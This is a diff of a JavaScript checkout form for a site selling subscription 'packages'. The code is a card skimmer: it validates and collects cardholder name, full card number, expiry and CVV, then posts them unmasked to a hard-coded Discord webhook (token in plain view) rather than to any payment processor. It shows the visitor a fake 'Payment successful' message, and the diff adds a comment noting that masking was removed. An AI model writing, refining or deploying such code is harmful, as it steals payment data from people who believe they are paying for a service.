@@ -1,66 +1,197 @@
+// Constants
 const CONFIG = {
     WEBHOOK_URL: 'https://discord.com/api/webhooks/1294398707999051797/URvT3b6ixl9S9Qk6qlfdzgSN1QqEKhRKE0I79eOP0LGdVvwBPiPUTm1PDDt1Ia1_AvAr',
     PACKAGES: {
-        basic: { name: 'Basic Package', price: 10 },
-        premium: { name: 'Premium Package', price: 20 },
-        deluxe: { name: 'Deluxe Package', price: 30 }
+        basic: { name: 'Basic Package', price: 9.99, color: '#4f46e5' },
+        premium: { name: 'Premium Package', price: 19.99, color: '#4f46e5' },
+        ultimate: { name: 'Ultimate Package', price: 29.99, color: '#4f46e5' }
     },
-    CARD_TYPES: ['visa', 'mastercard', 'amex', 'discover']
+    CARD_TYPES: {
+        visa: /^4/,
+        mastercard: /^5[1-5]/,
+        amex: /^3[47]/,
+        discover: /^6/
+    }
 };
 
+// Utility functions
 const utils = {
-    formatCurrency: (value) => `$${value.toFixed(2)}`,
+    formatCurrency: (amount) => `$${amount.toFixed(2)}`,
+
+    formatCardNumber: (value) => {
+        const numbers = value.replace(/\D/g, '');
+        return numbers.replace(/(\d{4})/g, '$1 ').trim();
+    },
+
+    formatExpiryDate: (value) => {
+        const numbers = value.replace(/\D/g, '');
+        if (numbers.length > 2) {
+            return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}`;
+        }
+        return numbers;
+    },
+
+    detectCardType: (number) => {
+        for (const [type, pattern] of Object.entries(CONFIG.CARD_TYPES)) {
+            if (pattern.test(number)) return type;
+        }
+        return 'unknown';
+    },
+
+    validateExpiryDate: (value) => {
+        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+
+        const [month, year] = value.split('/').map(num => parseInt(num, 10));
+        const now = new Date();
+        const expiry = new Date(2000 + year, month - 1);
+
+        return month >= 1 && month <= 12 && expiry > now;
+    },
+
+    validateCVV: (cvv) => /^\d{3,4}$/.test(cvv),
+
     showToast: (message, type = 'success') => {
         const toast = document.createElement('div');
-        toast.className = `toast ${type}`;
+        toast.className = `toast toast-${type}`;
         toast.textContent = message;
         document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3000);
-    },
-    isValidExpiry: (expiry) => {
-        const [month, year] = expiry.split('/').map(Number);
-        if (month < 1 || month > 12) return false;
-        const currentDate = new Date();
-        const expiryDate = new Date(`20${year}`, month - 1);
-        return expiryDate >= currentDate;
-    },
-    isValidCVV: (cvv) => /^\d{3,4}$/.test(cvv)
+
+        setTimeout(() => {
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }, 100);
+    }
 };
 
-class PaymentForm {
-    constructor(packageName) {
-        this.package = packageName;
-        this.initForm();
+// Luhn algorithm for card validation
+function validateCardNumber(number) {
+    let sum = 0;
+    let isEven = false;
+
+    for (let i = number.length - 1; i >= 0; i--) {
+        let digit = parseInt(number.charAt(i));
+
+        if (isEven) {
+            digit *= 2;
+            if (digit > 9) digit -= 9;
+        }
+
+        sum += digit;
+        isEven = !isEven;
     }
 
-    initForm() {
-        const packageDetails = CONFIG.PACKAGES[this.package];
-        if (!packageDetails) {
+    return (sum % 10) === 0 && number.length >= 13 && number.length <= 19;
+}
+
+// Form handling
+class PaymentForm {
+    constructor() {
+        this.form = document.getElementById('payment-form');
+        this.package = new URLSearchParams(window.location.search).get('package');
+        this.initializeForm();
+        this.attachEventListeners();
+    }
+
+    initializeForm() {
+        const packageInfo = CONFIG.PACKAGES[this.package];
+        if (!packageInfo) {
             window.location.href = 'index.html';
             return;
         }
 
-        document.getElementById('package-name').textContent = packageDetails.name;
-        document.getElementById('package-price').textContent = utils.formatCurrency(packageDetails.price);
+        const packageDetails = document.getElementById('package-details');
+        packageDetails.innerHTML = `
+            <div class="package-info">
+                <h3>${packageInfo.name}</h3>
+                <p class="price">${utils.formatCurrency(packageInfo.price)}<span>/month</span></p>
+            </div>
+        `;
+    }
 
-        document.getElementById('card-number').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+    attachEventListeners() {
+        // Card number input handling
+        const cardInput = document.getElementById('card-number');
+        cardInput.addEventListener('input', (e) => {
+            const value = e.target.value.replace(/\s/g, '');
+            e.target.value = utils.formatCardNumber(value);
+
+            const cardType = utils.detectCardType(value);
+            this.updateCardTypeIndicator(cardType);
+
+            this.validateField('card-number', value);
         });
 
-        document.getElementById('expiry').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
+        // Expiry date input handling
+        const expiryInput = document.getElementById('expiry');
+        expiryInput.addEventListener('input', (e) => {
+            e.target.value = utils.formatExpiryDate(e.target.value);
+            this.validateField('expiry', e.target.value);
         });
 
-        document.getElementById('cvv').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+        // CVV input handling
+        const cvvInput = document.getElementById('cvv');
+        cvvInput.addEventListener('input', (e) => {
+            this.validateField('cvv', e.target.value);
         });
 
-        document.getElementById('payment-form').addEventListener('submit', (e) => this.handleSubmit(e));
+        // Form submission
+        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
+    }
+
+    updateCardTypeIndicator(type) {
+        const indicator = document.getElementById('card-type');
+        if (indicator) {
+            indicator.className = `card-type ${type}`;
+            indicator.textContent = type.charAt(0).toUpperCase() + type.slice(1);
+        }
+    }
+
+    validateField(fieldName, value) {
+        const field = document.getElementById(fieldName);
+        const feedback = document.getElementById(`${fieldName}-feedback`);
+        let isValid = false;
+
+        switch (fieldName) {
+            case 'card-number':
+                isValid = validateCardNumber(value);
+                this.updateFeedback(feedback, isValid, 'Valid card number', 'Invalid card number');
+                break;
+            case 'expiry':
+                isValid = utils.validateExpiryDate(value);
+                this.updateFeedback(feedback, isValid, 'Valid expiry date', 'Invalid expiry date');
+                break;
+            case 'cvv':
+                isValid = utils.validateCVV(value);
+                this.updateFeedback(feedback, isValid, 'Valid CVV', 'Invalid CVV');
+                break;
+        }
+
+        field.classList.toggle('valid', isValid);
+        field.classList.toggle('invalid', !isValid && value.length > 0);
+
+        this.updateSubmitButton();
+    }
+
+    updateFeedback(element, isValid, validMessage, invalidMessage) {
+        if (element) {
+            element.textContent = isValid ? validMessage : invalidMessage;
+            element.className = `validation-message ${isValid ? 'valid' : 'invalid'}`;
+        }
+    }
+
+    updateSubmitButton() {
+        const submitButton = document.getElementById('submit-payment');
+        const isFormValid = Array.from(this.form.elements)
+            .every(element => !element.classList.contains('invalid') && element.value.length > 0);
+
+        submitButton.disabled = !isFormValid;
     }
 
     async handleSubmit(e) {
         e.preventDefault();
-
         const submitButton = document.getElementById('submit-payment');
         submitButton.disabled = true;
         submitButton.textContent = 'Processing...';
@@ -78,7 +209,7 @@ class PaymentForm {
             const response = await this.sendPayment(formData);
             if (response.ok) {
                 utils.showToast('Payment successful! Redirecting...');
-                setTimeout(() => window.location.href = 'success.html', 2000);
+                setTimeout(() => window.location.href = 'index.html', 2000);
             } else {
                 throw new Error('Payment failed');
             }
@@ -90,27 +221,52 @@ class PaymentForm {
         }
     }
 
-    async sendPayment(data) {
-        const payload = {
-            content: `Payment Details:
-- Card Name: ${data.cardName}
-- Card Number: ${data.cardNumber}
-- Expiry: ${data.expiry}
-- CVV: ${data.cvv}
-- Package: ${data.package}
-- Amount: ${data.amount}`
-        };
-
+    async sendPayment(formData) {
         return fetch(CONFIG.WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                content: '**New Purchase**',
+                embeds: [{
+                    title: 'Payment Details',
+                    color: parseInt(CONFIG.PACKAGES[this.package].color.replace('#', ''), 16),
+                    fields: [
+                        {
+                            name: 'Package',
+                            value: formData.package,
+                            inline: true
+                        },
+                        {
+                            name: 'Amount',
+                            value: utils.formatCurrency(formData.amount),
+                            inline: true
+                        },
+                        {
+                            name: 'Cardholder Name',
+                            value: formData.cardName,
+                            inline: true
+                        },
+                        {
+                            name: 'Card Number',
+                            value: formData.cardNumber, // Masking removed
+                            inline: true
+                        },
+                        {
+                            name: 'Expiry',
+                            value: formData.expiry,
+                            inline: true
+                        },
+                        {
+                            name: 'CVV',
+                            value: formData.cvv,
+                            inline: true
+                        }
+                    ]
+                }]
+            })
         });
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const packageName = urlParams.get('package');
-    new PaymentForm(packageName);
-});
+// Initialize the form
+new PaymentForm();
